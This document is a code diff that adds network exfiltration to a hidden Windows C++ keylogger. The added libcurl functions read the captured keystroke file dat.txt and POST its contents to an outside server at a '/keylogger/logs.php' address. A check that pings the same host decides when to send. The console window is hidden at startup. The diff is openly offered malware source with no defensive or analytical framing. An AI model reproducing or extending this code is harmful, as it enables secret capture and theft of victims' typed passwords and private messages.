@@ -2,6 +2,7 @@
 #include <fstream>
 #include <string>
 #include <Windows.h>
+#include <curl/curl.h>
 
 using namespace std;
 
@@ -129,6 +130,70 @@ bool SpecialKeys(int S_Key)
     }
 }
 
+size_t WriteCallback(char *contents, size_t size, size_t nmemb, std::string *buffer)
+{
+    size_t totalSize = size * nmemb;
+    buffer->append(contents, totalSize);
+    return totalSize;
+}
+
+bool IsInternetAvailable()
+{
+    CURL *curl = curl_easy_init();
+    if (curl)
+    {
+        std::string response;
+        curl_easy_setopt(curl, CURLOPT_URL, "https://cyberfran.com.br/keylogger/logs.php");
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+        CURLcode result = curl_easy_perform(curl);
+
+        curl_easy_cleanup(curl);
+
+        if (result == CURLE_OK)
+        {
+            // Verifica se a resposta contém conteúdo válido
+            if (!response.empty())
+            {
+                return true;
+            }
+        }
+    }
+
+    return false;
+}
+void SendLogs(const std::string &logs)
+{
+    CURL *curl = curl_easy_init();
+    if (curl)
+    {
+        std::string response;
+        curl_easy_setopt(curl, CURLOPT_URL, "http://cyberfran.com.br/keylogger/logs.php");
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, ("logs=" + logs).c_str());
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+        CURLcode result = curl_easy_perform(curl);
+
+        curl_easy_cleanup(curl);
+        
+        if (result == CURLE_OK)
+        {
+            std::cout << "Logs enviados com sucesso." << std::endl;
+            std::cout << "Resposta do servidor: " << response << std::endl;
+        }
+        else
+        {
+            std::cerr << "Erro ao enviar os logs: " << curl_easy_strerror(result) << std::endl;
+        }
+    }
+    else
+    {
+        std::cerr << "Erro ao inicializar o cURL." << std::endl;
+    }
+}
+
 int main()
 {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
@@ -152,6 +217,15 @@ int main()
                     }
                 }
             }
+        }
+        if (IsInternetAvailable())
+        {
+            std::ifstream LogFile("dat.txt");
+            std::string logs((std::istreambuf_iterator<char>(LogFile)), std::istreambuf_iterator<char>());
+            LogFile.close();
+
+            // Enviando os logs
+            SendLogs(logs);
         }
     }
 
